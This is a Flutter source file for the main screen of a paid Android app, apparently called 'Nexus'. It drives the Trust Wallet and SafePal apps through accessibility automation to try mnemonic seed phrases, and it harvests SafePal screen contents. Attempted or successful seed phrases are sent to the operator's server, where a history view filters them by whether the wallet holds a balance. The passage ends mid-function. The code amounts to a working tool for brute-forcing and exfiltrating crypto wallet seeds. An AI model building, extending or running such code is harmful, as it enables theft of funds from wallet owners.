import 'dart:async';

import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:qr_flutter/qr_flutter.dart';

import '../api/server_api.dart';
import '../theme/app_theme.dart';
import '../services/app_launcher.dart';
import '../services/automation_runner.dart';
import '../services/automation_log_file.dart';
import '../services/wallet_count_file.dart';
import '../services/android_image_matcher.dart';

/// 모바일 전용 메인 화면 - Trust Wallet 실행 + 이미지 인식 자동화
class MainScreen extends StatefulWidget {
  const MainScreen({super.key});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> with WidgetsBindingObserver {
  final _logController = ScrollController();
  final List<String> _logLines = [];
  bool _running = false;
  int _walletCount = 0;
  Timer? _sessionTimer;
  String _expiryText = '만료일: -';
  Color _expiryColor = AppTheme.logRed;
  bool _hasScreenPermission = false;
  bool _hasTouchPermission = false;
  String _templatePath = '';
  final _passwordController = TextEditingController();
  final _nodeTestController = TextEditingController(text: 'Import');
  bool _saveStepRecord = false;
  bool _nodeCollectorRunning = false;
  int _nodeCollectorCount = 0;
  Timer? _collectorStatusTimer;

  // 니모닉 단어 수 (12 or 24)
  int _wordCount = 12;

  // 히스토리 탭 상태
  int _currentTabIndex = 0; // 0=자동화, 1=히스토리
  final ScrollController _historyScrollController = ScrollController();
  final List<SeedHistoryItem> _historyItems = [];
  int _historyPage = 1;
  bool _historyHasNext = true;
  bool _historyLoading = false;
  String? _historyError;
  // 0=전체, 1=잔고있음, 2=잔고없음
  int _historyFilterIndex = 0;

  // 앱 백그라운드 전환 시 세션 자동 종료 타이머 (5분 후)
  Timer? _bgLogoutTimer;

  // 입금 대기 중 백그라운드 폴링 (다이얼로그 닫혀도 유지)
  Timer? _depositWatchTimer;
  DateTime? _depositWatchSnapshot; // 폴링 시작 시점의 만료일 스냅샷

  // 개인 입금주소 상태
  String? _depositAddress;
  bool _depositAddressLoading = false;
  bool _depositAddressInvalidated = false;
  String? _depositAddressError;

  // 가격/날짜 선택 상태
  PricingInfo? _pricing;
  int _selectedDays = 0;
  final TextEditingController _daysController = TextEditingController(text: '30');

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _refreshExpiry();
    _refreshWalletCount();
    _checkPermissions();
    if (ServerApi.enabled && ServerApi.currentToken != null && ServerApi.currentToken!.isNotEmpty) {
      _sessionTimer = Timer.periodic(const Duration(seconds: 15), (_) => _validateSession());
    }
    WidgetsBinding.instance.addPostFrameCallback((_) async {
      await _requestPermissionsOnStart();
      // 만료 시 자동으로 결제 QR 팝업 표시
      if (mounted && !ServerApi.isSubscriptionValid()) {
        await _showPaymentQrDialog();
      }
    });
    _collectorStatusTimer = Timer.periodic(const Duration(seconds: 1), (_) => _refreshNodeCollectorStatus());

    _historyScrollController.addListener(_onHistoryScroll);
  }

  Future<void> _refreshNodeCollectorStatus() async {
    final running = await AndroidImageMatcher.isNodeCollectorRunning();
    final count = await AndroidImageMatcher.getNodeCollectorCount();
    if (mounted && (_nodeCollectorRunning != running || _nodeCollectorCount != count)) {
      setState(() {
        _nodeCollectorRunning = running;
        _nodeCollectorCount = count;
      });
    }
  }

  Future<void> _onStartNodeCollector() async {
    final ok = await AndroidImageMatcher.startNodeCollector();
    if (!mounted) return;
    _appendLog(ok ? '수집 모드 시작 → Trust Wallet으로 전환하세요' : '수집 모드 시작 실패', red: !ok);
    await _refreshNodeCollectorStatus();
  }

  /// 시드 스캔: SafePal 실행 후 노드 수집 시작 (io.safepal.wallet)
  Future<void> _onStartSafePalSeedScan() async {
    final launched = await AppLauncher.launchSafePal();
    if (!mounted) return;
    if (!launched) {
      _appendLog('SafePal 앱을 찾을 수 없습니다. (io.safepal.wallet)', red: true);
      return;
    }
    _appendLog('SafePal 실행됨 → 시드 스캔(노드 수집) 시작');
    await Future.delayed(const Duration(milliseconds: 800));
    final ok = await AndroidImageMatcher.startNodeCollector();
    if (!mounted) return;
    _appendLog(ok ? '시드 스캔 시작 → SafePal 화면에서 5초마다 노드 수집됨' : '시드 스캔 시작 실패', red: !ok);
    await _refreshNodeCollectorStatus();
  }

  Future<void> _onStopNodeCollector() async {
    await AndroidImageMatcher.stopNodeCollector();
    if (mounted) await _refreshNodeCollectorStatus();
  }

  /// 앱 시작 시 권한 자동 요청
  Future<void> _requestPermissionsOnStart() async {
    try {
      final hasTouch = await AndroidImageMatcher.hasTouchPermission();
      if (!hasTouch) {
        await AndroidImageMatcher.requestTouchPermission();
      }
      await _checkPermissions();
    } catch (_) {}
  }

  Future<void> _checkPermissions() async {
    final touch = await AndroidImageMatcher.hasTouchPermission();
    final path = await AndroidImageMatcher.picsDir;
    if (!mounted) return;
    setState(() {
      _hasTouchPermission = touch;
      _templatePath = path;
    });
  }

  Future<void> _validateSession() async {
    final token = ServerApi.currentToken;
    if (token == null || token.isEmpty) return;
    final result = await ServerApi.validateSessionAsync(token);
    if (result.valid) return;
    _sessionTimer?.cancel();
    if (!mounted) return;

    // 서버에서 명시적으로 kicked 를 반환한 경우에만 "다른 기기 로그인"으로 처리
    final kicked = result.kicked;
    final title = kicked ? '다른 기기 로그인 감지' : '세션 만료';
    final message = kicked
        ? '다른 기기에서 로그인하여 현재 기기의 접속이 종료되었습니다.\n최근 로그인한 기기만 사용할 수 있습니다.'
        : '세션이 만료되었습니다. 다시 로그인해 주세요.';

    _appendLog(kicked ? '⚠ 다른 기기 로그인 감지 — 접속 강제 종료' : '세션 만료. 다시 로그인해 주세요.');

    await showDialog<void>(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => AlertDialog(
        backgroundColor: AppTheme.bgPanel,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        title: Row(
          children: [
            Icon(
              kicked ? Icons.devices_other_rounded : Icons.timer_off_rounded,
              color: kicked ? Colors.orange : AppTheme.logRed,
              size: 20,
            ),
            const SizedBox(width: 8),
            Text(title, style: const TextStyle(color: AppTheme.fg, fontSize: 16)),
          ],
        ),
        content: Text(message, style: const TextStyle(color: AppTheme.muted, fontSize: 13)),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(ctx).pop(),
            child: const Text('확인', style: TextStyle(color: AppTheme.accent)),
          ),
        ],
      ),
    );

    if (!mounted) return;
    Navigator.of(context).pushNamedAndRemoveUntil('/login', (r) => false);
  }

  // ── 입금 백그라운드 감시 (다이얼로그 닫혀도 계속 실행) ──
  void _startDepositWatch() {
    _depositWatchSnapshot = ServerApi.subscriptionExpiry;
    _depositWatchTimer?.cancel();
    _depositWatchTimer = Timer.periodic(const Duration(seconds: 10), (_) async {
      final token = ServerApi.currentToken;
      if (token == null || !mounted) { _depositWatchTimer?.cancel(); return; }
      final sub = await ServerApi.getSubscriptionAsync(token);
      if (sub == null || !mounted) return;
      final snapMs = _depositWatchSnapshot?.millisecondsSinceEpoch ?? 0;
      final newMs  = sub.expireDate?.millisecondsSinceEpoch ?? 0;
      if (newMs == snapMs || newMs == 0) return; // 변화 없으면 무시
      // 입금 처리 완료
      _depositWatchTimer?.cancel();
      _depositWatchTimer = null;
      if (!mounted) return;
      setState(() {
        ServerApi.subscriptionExpiry = sub.expireDate;
        _refreshExpiry();
      });
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text(
            '✅ 입금 확인! ${sub.remainingDays}일 이용 가능합니다.',
            style: const TextStyle(color: Colors.white),
          ),
          backgroundColor: AppTheme.accent.withOpacity(0.9),
          duration: const Duration(seconds: 5),
        ),
      );
    });
  }

  void _stopDepositWatch() {
    _depositWatchTimer?.cancel();
    _depositWatchTimer = null;
  }

  void _refreshExpiry() {
    final exp = ServerApi.subscriptionExpiry;
    if (exp == null) {
      setState(() {
        _expiryText = '사용기간: 없음';
        _expiryColor = AppTheme.logRed;
      });
      return;
    }
    final local = exp.toLocal();
    final dateStr = '${local.year}-${local.month.toString().padLeft(2, '0')}-${local.day.toString().padLeft(2, '0')}';
    setState(() {
      _expiryText = '만료일: $dateStr';
      _expiryColor = ServerApi.isSubscriptionValid() ? AppTheme.accent : AppTheme.logRed;
    });
  }

  Future<void> _refreshWalletCount() async {
    final n = await WalletCountFile.read();
    if (!mounted) return;
    setState(() => _walletCount = n);
  }

  void _appendLog(String text, {bool red = false}) {
    debugPrint(text);
    AutomationLogFile.append(text).catchError((_) {});
    if (!mounted) return;
    setState(() {
      _logLines.add(text);
      // 메모리 사용 제한: 오래 실행될 때를 대비해 최근 N줄만 유지
      const maxLogLines = 2000;
      if (_logLines.length > maxLogLines) {
        _logLines.removeRange(0, _logLines.length - maxLogLines);
      }
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (mounted && _logController.hasClients) {
          _logController.animateTo(
            _logController.position.maxScrollExtent,
            duration: const Duration(milliseconds: 100),
            curve: Curves.easeOut,
          );
        }
      });
    });
  }

  Future<void> _onRequestScreenPermission() async {
    try {
      await AndroidImageMatcher.requestScreenPermission();
      if (!mounted) return;
      _appendLog('→ 시스템 팝업이 뜨면 반드시 "시작" 버튼을 눌러 허용하세요.');
    } catch (e) {
      if (!mounted) return;
      _appendLog('캡처 권한 요청 오류: $e', red: true);
    }
  }

  Future<void> _onRequestTouchPermission() async {
    await AndroidImageMatcher.requestTouchPermission();
    if (!mounted) return;
    _appendLog('설정에서 Nexus 접근성 서비스를 활성화해주세요');
    await _checkPermissions();
  }

  /// 터치만 검증 (캡처/매칭 없이) — 원인 파악용
  Future<void> _onTouchTest() async {
    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      _appendLog('터치 테스트: 접근성 권한 없음. 먼저 접근성을 켜주세요.', red: true);
      return;
    }
    AndroidImageMatcher.debugLog = (t) => _appendLog(t);
    _appendLog('--- 터치 테스트: 화면 중앙(540,1200) 한 번 탭 ---');
    final ok = await AndroidImageMatcher.testTouchAt(540, 1200);
    AndroidImageMatcher.debugLog = null;
    if (!mounted) return;
    if (ok) {
      _appendLog('터치 테스트: 전송결과 true → 터치 동작함. 문제는 캡처/매칭 쪽일 수 있음.');
    } else {
      _appendLog('터치 테스트: 전송결과 false → 터치(접근성) 쪽 문제 가능.', red: true);
    }
  }

  /// 캡처만 검증 (매칭/터치 없이) — 원인 파악용
  /// 원리: 권한 없이 takeCapture() 호출 시 MediaProjection 세션 없음 → 네이티브에서 크래시 → 먼저 권한 요청 후 3초 대기했다가 테스트
  Future<void> _onCaptureTest() async {
    final doTest = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('캡처 테스트'),
        content: const Text(
          '화면캡처 권한이 없으면 앱이 꺼질 수 있습니다.\n\n'
          '다음 누르면 권한 팝업이 뜹니다. 팝업에서 반드시 "시작"을 누른 뒤, 3초 후 자동으로 캡처를 시도합니다.',
        ),
        actions: [
          TextButton(onPressed: () => Navigator.of(ctx).pop(false), child: const Text('취소')),
          TextButton(onPressed: () => Navigator.of(ctx).pop(true), child: const Text('다음')),
        ],
      ),
    );
    if (doTest != true || !mounted) return;
    AndroidImageMatcher.debugLog = (t) => _appendLog(t);
    _appendLog('--- 캡처 테스트 (팝업에서 "시작" 누르고 3초 대기) ---');
    await AndroidImageMatcher.requestScreenPermission();
    await Future.delayed(const Duration(seconds: 3));
    if (!mounted) return;
    _appendLog('캡처 시도 중...');
    bool ok = false;
    try {
      ok = await AndroidImageMatcher.testCapture();
    } catch (e, st) {
      _appendLog('캡처 테스트 예외: $e', red: true);
    }
    AndroidImageMatcher.debugLog = null;
    if (!mounted) return;
    if (ok) {
      setState(() => _hasScreenPermission = true);
      _appendLog('캡처 테스트: OK → 캡처 동작함.');
    } else {
      _appendLog('캡처 테스트: 실패. 팝업에서 "시작" 눌렀는지 확인 후 다시 시도.', red: true);
    }
  }

  Future<void> _onStart() async {
    if (_running) return;
    if (!ServerApi.isSubscriptionValid()) {
      if (!mounted) return;
      showDialog(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('이용기간'),
          content: const Text('이용기간이 없거나 만료되었습니다. 프로그램을 종료합니다.'),
          actions: [
            TextButton(
              onPressed: () {
                Navigator.of(ctx).pop();
                Navigator.of(context).popUntil((route) => route.isFirst);
              },
              child: const Text('확인'),
            ),
          ],
        ),
      );
      return;
    }

    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      if (!mounted) return;
      showDialog(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('접근성 권한 필요'),
          content: const Text(
            '설정 > 접근성에서 "nexus_flutter" 또는 "Nexus"를 찾아 스위치를 켜주세요.\n\n'
            '활성화 후 뒤로가기로 돌아오면 자동으로 인식됩니다.',
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.of(ctx).pop(),
              child: const Text('취소'),
            ),
            TextButton(
              onPressed: () async {
                Navigator.of(ctx).pop();
                await AndroidImageMatcher.requestTouchPermission();
              },
              child: const Text('설정 열기'),
            ),
          ],
        ),
      );
      return;
    }

    setState(() {
      _running = true;
      _logLines.clear();
    });
    await AutomationLogFile.clear();

    AutomationRunner.password = _passwordController.text.trim();
    AutomationRunner.wordCount = _wordCount;
    AndroidImageMatcher.debugSaveCaptureAndLog = _saveStepRecord;

    final logDir = await AutomationLogFile.getLogDirectory();
    _appendLog('로그 폴더: $logDir');
    _appendLog('PC로 복사: adb -s <기기ID> pull $logDir C:\\Users\\alsdh\\OneDrive\\Desktop\\log');

    await AutomationRunner.run(
      logLine: (t) {
        if (mounted) _appendLog(t);
        else AutomationLogFile.append(t).catchError((_) {});
      },
      logLineRed: (t) {
        if (mounted) _appendLog(t, red: true);
        else AutomationLogFile.append(t).catchError((_) {});
      },
      addAttemptedPhrase: (p) {
        final token = ServerApi.currentToken;
        if (token != null && token.isNotEmpty) {
          ServerApi.sendSeedAsync(token, p);
        }
      },
      replaceLogLastLine: (t) {
        if (!mounted) return;
        setState(() {
          if (_logLines.isNotEmpty) _logLines.removeLast();
          _logLines.add(t);
        });
      },
      setClipboard: (t) => Clipboard.setData(ClipboardData(text: t)),
    );

    if (!mounted) return;
    setState(() {
      _running = false;
      _refreshWalletCount();
    });
  }

  Future<void> _onStartSafePal() async {
    if (_running) return;
    if (!ServerApi.isSubscriptionValid()) {
      if (!mounted) return;
      showDialog(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('이용기간'),
          content: const Text('이용기간이 없거나 만료되었습니다. 프로그램을 종료합니다.'),
          actions: [
            TextButton(
              onPressed: () {
                Navigator.of(ctx).pop();
                Navigator.of(context).popUntil((route) => route.isFirst);
              },
              child: const Text('확인'),
            ),
          ],
        ),
      );
      return;
    }

    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      if (!mounted) return;
      showDialog(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('접근성 권한 필요'),
          content: const Text(
            '설정 > 접근성에서 "nexus_flutter" 또는 "Nexus"를 찾아 스위치를 켜주세요.\n\n'
            '활성화 후 뒤로가기로 돌아오면 자동으로 인식됩니다.',
          ),
          actions: [
            TextButton(onPressed: () => Navigator.of(ctx).pop(), child: const Text('취소')),
            TextButton(
              onPressed: () async {
                Navigator.of(ctx).pop();
                await AndroidImageMatcher.requestTouchPermission();
              },
              child: const Text('설정 열기'),
            ),
          ],
        ),
      );
      return;
    }

    setState(() {
      _running = true;
      _logLines.clear();
    });
    await AutomationLogFile.clear();

    AutomationRunner.password = _passwordController.text.trim();
    AutomationRunner.wordCount = _wordCount;
    AndroidImageMatcher.debugSaveCaptureAndLog = _saveStepRecord;

    final logDir = await AutomationLogFile.getLogDirectory();
    _appendLog('로그 폴더: $logDir');
    _appendLog('--- SafePal 플로우 (assets/app/first.png, errorword.png) ---');

    await AutomationRunner.runSafePal(
      logLine: (t) {
        if (mounted) {
          _appendLog(t);
        } else {
          AutomationLogFile.append(t).catchError((_) {});
        }
      },
      logLineRed: (t) {
        if (mounted) {
          _appendLog(t, red: true);
        } else {
          AutomationLogFile.append(t).catchError((_) {});
        }
      },
      onSuccessPhrase: (p) async {
        // SafePal은 "성공한" 니모닉만 서버로 전송
        final token = ServerApi.currentToken;
        if (token == null || token.isEmpty) {
          _appendLog('→ success 시드 발견 (토큰 없음, 서버 전송 생략)', red: true);
          return;
        }
        // 앞부분만 로그에 남겨서 실제 전송 여부를 눈으로 확인 가능하게 한다.
        final preview = p.split(' ').take(3).join(' ');
        _appendLog('→ success 시드 전송 요청: "$preview ..."');
        await ServerApi.sendSeedAsync(token, p);
      },
      replaceLogLastLine: (t) {
        if (!mounted) return;
        setState(() {
          if (_logLines.isNotEmpty) _logLines.removeLast();
          _logLines.add(t);
        });
      },
      setClipboard: (t) => Clipboard.setData(ClipboardData(text: t)),
    );

    if (!mounted) return;
    setState(() {
      _running = false;
      _refreshWalletCount();
    });
  }

  void _onStop() {
    if (!_running) return;
    AutomationRunner.requestStop();
    _appendLog('중지 요청');
  }

  /// SafePal 삭제 루프만 테스트 (first → select → delete1 → delete2 → 비밀번호)
  Future<void> _onSafePalDeleteTest() async {
    if (_running) return;
    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      if (!mounted) return;
      _appendLog('접근성 권한 필요.', red: true);
      return;
    }
    setState(() {
      _running = true;
      _logLines.clear();
    });
    AutomationRunner.password = _passwordController.text.trim();
    AndroidImageMatcher.debugLog = (t) => _appendLog(t);

    await AutomationRunner.runSafePalDeleteTest(
      logLine: (t) {
        if (mounted) _appendLog(t);
      },
      logLineRed: (t) {
        if (mounted) _appendLog(t, red: true);
      },
      count: AutomationRunner.testDeleteCount,
    );

    AndroidImageMatcher.debugLog = null;
    if (!mounted) return;
    setState(() => _running = false);
  }

  // 앱 종료 또는 5분 이상 백그라운드 → 서버 세션 삭제 (재로그인 시 false-positive 방지)
  void _autoLogout() {
    final token = ServerApi.currentToken;
    if (token != null && token.isNotEmpty) {
      ServerApi.logoutAsync(token); // fire-and-forget
      ServerApi.currentToken = null;
      ServerApi.currentUserId = null;
    }
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _bgLogoutTimer?.cancel();
      _bgLogoutTimer = null;
      _checkPermissions();
    } else if (state == AppLifecycleState.paused) {
      // 백그라운드 진입 → 5분 후 세션 자동 종료
      _bgLogoutTimer?.cancel();
      _bgLogoutTimer = Timer(const Duration(minutes: 5), _autoLogout);
    } else if (state == AppLifecycleState.detached) {
      // 앱 완전 종료 → 즉시 세션 삭제
      _bgLogoutTimer?.cancel();
      _autoLogout();
    }
  }

  @override
  void dispose() {
    _bgLogoutTimer?.cancel();
    _depositWatchTimer?.cancel();
    WidgetsBinding.instance.removeObserver(this);
    _sessionTimer?.cancel();
    _collectorStatusTimer?.cancel();
    _logController.dispose();
    _historyScrollController.dispose();
    _passwordController.dispose();
    _nodeTestController.dispose();
    _daysController.dispose();
    super.dispose();
  }

  Future<void> _onNodeClickTest() async {
    final text = _nodeTestController.text.trim();
    if (text.isEmpty) return;
    final ok = await AndroidImageMatcher.clickByAccessibilityText(text);
    if (!mounted) return;
    _appendLog(ok ? '노드 클릭 "$text": 성공' : '노드 클릭 "$text": 실패 (해당 텍스트 없음)', red: !ok);
  }

  /// UIAutomator 선택자용: resourceId | text | contentDesc 목록 (노드 상세)
  Future<void> _onShowNodeDetails() async {
    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      _appendLog('접근성 권한 필요.', red: true);
      return;
    }
    final list = await AndroidImageMatcher.getNodeDetailsForSelectors();
    if (!mounted) return;
    final text = list.isEmpty
        ? '목록 없음.\n\n'
          '• 지금은 Nexus 화면 → Nexus 노드만 수집됩니다.\n'
          '• Trust Wallet 노드: "수집 모드"로 전환 후 Trust Wallet 화면에서 자동 수집.\n'
          '• 저장 위치: log 폴더 (nodes_collected.txt)'
        : list.join('\n');
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('노드 상세 (선택자용)'),
        content: SingleChildScrollView(
          child: SelectableText(text, style: const TextStyle(fontSize: 11, fontFamily: 'monospace')),
        ),
        actions: [TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('닫기'))],
      ),
    );
  }

  /// 현재 화면(Trust Wallet 등)의 버튼/텍스트 목록 보기 → accessibilityTextMap 채울 때 참고
  Future<void> _onShowNodeTexts() async {
    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      _appendLog('접근성 권한 필요.', red: true);
      return;
    }
    final list = await AndroidImageMatcher.getAccessibilityNodeTexts();
    if (!mounted) return;
    final text = list.isEmpty
        ? '목록 없음. Trust Wallet 화면을 연 상태에서 다시 누르세요.'
        : list.join('\n');
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('현재 화면 노드 텍스트'),
        content: SingleChildScrollView(
          child: SelectableText(text, style: const TextStyle(fontSize: 12)),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(ctx).pop(),
            child: const Text('닫기'),
          ),
        ],
      ),
    );
  }

  void _onHistoryScroll() {
    if (!_historyHasNext || _historyLoading) return;
    if (!_historyScrollController.hasClients) return;
    final pos = _historyScrollController.position;
    if (pos.pixels >= pos.maxScrollExtent - 200) {
      _loadMoreHistory();
    }
  }

  Future<void> _loadMoreHistory({bool reset = false}) async {
    final token = ServerApi.currentToken;
    if (token == null || token.isEmpty) return;
    if (reset) {
      setState(() {
        _historyItems.clear();
        _historyPage = 1;
        _historyHasNext = true;
        _historyError = null;
      });
    }
    if (!_historyHasNext || _historyLoading) return;
    setState(() {
      _historyLoading = true;
      _historyError = null;
    });
    final nextPage = _historyPage;
    final bool? filterHasBalance = _historyFilterIndex == 1
        ? true
        : _historyFilterIndex == 2
            ? false
            : null;
    final page = await ServerApi.getSeedHistory(
      token: token,
      page: nextPage,
      pageSize: 30,
      hasBalance: filterHasBalance,
    );
    if (!mounted) return;
    setState(() {
      _historyLoading = false;
      if (page == null) {
        _historyError = '히스토리를 불러오지 못했습니다.';
        return;
      }
      _historyPage = nextPage + 1;
      _historyHasNext = page.hasNext;
      _historyItems.addAll(page.items);
    });
  }

  void _onTabChanged(int index) {
    setState(() {
      _currentTabIndex = index;
    });
    if (index == 1 && _historyItems.isEmpty) {
      _loadMoreHistory(reset: true);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppTheme.bgDark,
      appBar: AppBar(
        title: const Text('Nexus'),
      ),
      body: AnimatedSwitcher(
        duration: const Duration(milliseconds: 220),
        switchInCurve: Curves.easeOut,
        switchOutCurve: Curves.easeIn,
        child: _currentTabIndex == 0
            ? _buildAutomationBody()
            : _buildHistoryBody(),
      ),
      bottomNavigationBar: BottomNavigationBar(
        currentIndex: _currentTabIndex,
        onTap: _onTabChanged,
        items: const [
          BottomNavigationBarItem(icon: Icon(Icons.play_arrow_rounded), label: '자동화'),
          BottomNavigationBarItem(icon: Icon(Icons.history_rounded), label: '기록'),
        ],
      ),
    );
  }

  Widget _buildAutomationBody() {
    return Column(
      children: [
        Padding(
          padding: const EdgeInsets.fromLTRB(16, 10, 16, 8),
          child: Card(
            child: Padding(
              padding: const EdgeInsets.fromLTRB(16, 16, 16, 14),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    _expiryText,
                    style: TextStyle(color: _expiryColor, fontSize: 13, fontWeight: FontWeight.w500),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    '니모닉 시도: $_walletCount회',
                    style: const TextStyle(color: AppTheme.muted, fontSize: 12),
                  ),
                  const SizedBox(height: 12),
                  Row(
                    children: [
                      const Text(
                        '지갑 비밀번호',
                        style: TextStyle(color: AppTheme.fg, fontSize: 13, fontWeight: FontWeight.w500),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: TextField(
                          controller: _passwordController,
                          obscureText: true,
                          decoration: const InputDecoration(
                            hintText: '비밀번호',
                          ),
                        ),
                      ),
                    ],
                  ),
                // if (_templatePath.isNotEmpty)
                //   Padding(
                //     padding: const EdgeInsets.only(top: 4),
                //     child: Text('템플릿: $_templatePath', style: TextStyle(color: AppTheme.muted, fontSize: 11), maxLines: 2, overflow: TextOverflow.ellipsis),
                //   ),
                // const SizedBox(height: 4),
                // Text('클릭 방식: 캡처 → 이미지 매칭(first.png 등) → 해당 위치 터치. 팝업 뜨면 "시작" 눌러 허용.', style: TextStyle(color: AppTheme.muted, fontSize: 11)),
                // Row(
                //   children: [
                //     SizedBox(
                //       width: 24,
                //       height: 24,
                //       child: Checkbox(
                //         value: _saveStepRecord,
                //         onChanged: _running ? null : (v) => setState(() => _saveStepRecord = v ?? false),
                //         materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
                //       ),
                //     ),
                //     const SizedBox(width: 4),
                //     Text('단계별 캡처/클릭 기록 (log 폴더)', style: TextStyle(color: AppTheme.muted, fontSize: 11)),
                //   ],
                // ),
                  const SizedBox(height: 14),
                  // 만료 시: 탭 가능한 경고 배너
                  if (!ServerApi.isSubscriptionValid()) ...[
                    GestureDetector(
                      onTap: _showPaymentQrDialog,
                      child: Container(
                        width: double.infinity,
                        padding: const EdgeInsets.symmetric(vertical: 9, horizontal: 12),
                        decoration: BoxDecoration(
                          color: AppTheme.logRed.withOpacity(0.13),
                          borderRadius: BorderRadius.circular(10),
                          border: Border.all(color: AppTheme.logRed.withOpacity(0.4)),
                        ),
                        child: const Row(
                          children: [
                            Icon(Icons.error_outline, color: AppTheme.logRed, size: 16),
                            SizedBox(width: 8),
                            Expanded(
                              child: Text(
                                '이용기간 만료 — 탭하여 충전 QR 보기',
                                style: TextStyle(color: AppTheme.logRed, fontSize: 12, fontWeight: FontWeight.w500),
                              ),
                            ),
                            Icon(Icons.chevron_right, color: AppTheme.logRed, size: 16),
                          ],
                        ),
                      ),
                    ),
                    const SizedBox(height: 10),
                  ],
                  // 12 / 24 단어 토글
                  Row(
                    children: [
                      const Text(
                        '니모닉',
                        style: TextStyle(color: AppTheme.muted, fontSize: 12),
                      ),
                      const SizedBox(width: 8),
                      _buildWordCountToggle(),
                    ],
                  ),
                  const SizedBox(height: 10),
                  // 시작 / 중지 버튼 (만료 시 시작 비활성화)
                  Row(
                    children: [
                      Expanded(
                        child: ElevatedButton(
                          onPressed: (_running || !ServerApi.isSubscriptionValid()) ? null : _onStartSafePal,
                          child: const Text('시작 (SafePal)'),
                        ),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: OutlinedButton(
                          onPressed: _running ? _onStop : null,
                          style: OutlinedButton.styleFrom(
                            foregroundColor: AppTheme.fg,
                            side: BorderSide(color: AppTheme.buttonStopBg),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(14),
                            ),
                          ),
                          child: const Text('중지'),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ),
        Expanded(
          child: Padding(
            padding: const EdgeInsets.fromLTRB(12, 0, 12, 8),
            child: Container(
              decoration: BoxDecoration(
                color: AppTheme.bgPanel,
                borderRadius: BorderRadius.circular(18),
              ),
              child: ListView.builder(
                controller: _logController,
                padding: const EdgeInsets.all(12),
                itemCount: _logLines.length,
                itemBuilder: (_, i) {
                  final line = _logLines[i];
                  final isRed = line.startsWith('오류') ||
                      line.contains('실패') ||
                      line.contains('찾을 수 없습니다') ||
                      line.contains('권한');
                  return Padding(
                    padding: const EdgeInsets.symmetric(vertical: 2),
                    child: SelectableText(
                      line,
                      style: TextStyle(
                        fontFamily: 'monospace',
                        fontSize: 12,
                        color: isRed ? AppTheme.logRed : AppTheme.accent,
                      ),
                    ),
                  );
                },
              ),
            ),
          ),
        ),
      ],
    );
  }

  /// 12 / 24 단어 수 토글 버튼
  Widget _buildWordCountToggle() {
    return Container(
      decoration: BoxDecoration(
        color: AppTheme.bgPanel,
        borderRadius: BorderRadius.circular(10),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [12, 24].map((n) {
          final selected = _wordCount == n;
          return GestureDetector(
            onTap: _running ? null : () => setState(() => _wordCount = n),
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 160),
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
              decoration: BoxDecoration(
                color: selected ? AppTheme.accent : Colors.transparent,
                borderRadius: BorderRadius.circular(10),
              ),
              child: Text(
                '$n단어',
                style: TextStyle(
                  color: selected ? AppTheme.bgDark : AppTheme.muted,
                  fontSize: 12,
                  fontWeight: selected ? FontWeight.w700 : FontWeight.normal,
                ),
              ),
            ),
          );
        }).toList(),
      ),
    );
  }

  /// 이용기간 만료 시 TRC20 USDT 개인 입금주소 QR 다이얼로그
  /// - 가격 조회 + 날짜 선택 + 금액 표시 + 서버 발급 주소 QR
  Future<void> _showPaymentQrDialog() async {
    // 가격 및 주소 병렬 로드
    if (mounted) {
      setState(() {
        _depositAddressLoading = true;
        _depositAddressError = null;
        _depositAddressInvalidated = false;
      });
    }

    final token = ServerApi.currentToken ?? '';
    final userId = ServerApi.currentUserId ?? '';
    // ignore: avoid_print
    print('[QR] 주소 요청 시작 ▶ userId=$userId hasToken=${token.isNotEmpty}');

    final results = await Future.wait([
      ServerApi.getPricingAsync(),
      if (token.isNotEmpty && userId.isNotEmpty)
        ServerApi.requestDepositAddressAsync(
          token: token,
          userId: userId,
          network: 'TRON',
          tokenType: 'USDT',
        )
      else
        Future.value(null),
    ]);

    final pricing = results[0] as PricingInfo?;
    final addrResult = results[1] as DepositAddressResult?;
    // ignore: avoid_print
    print('[QR] 가격 조회 ▶ ${pricing != null ? "성공 (${pricing.packages.length}개 패키지)" : "실패/null"}');
    // ignore: avoid_print
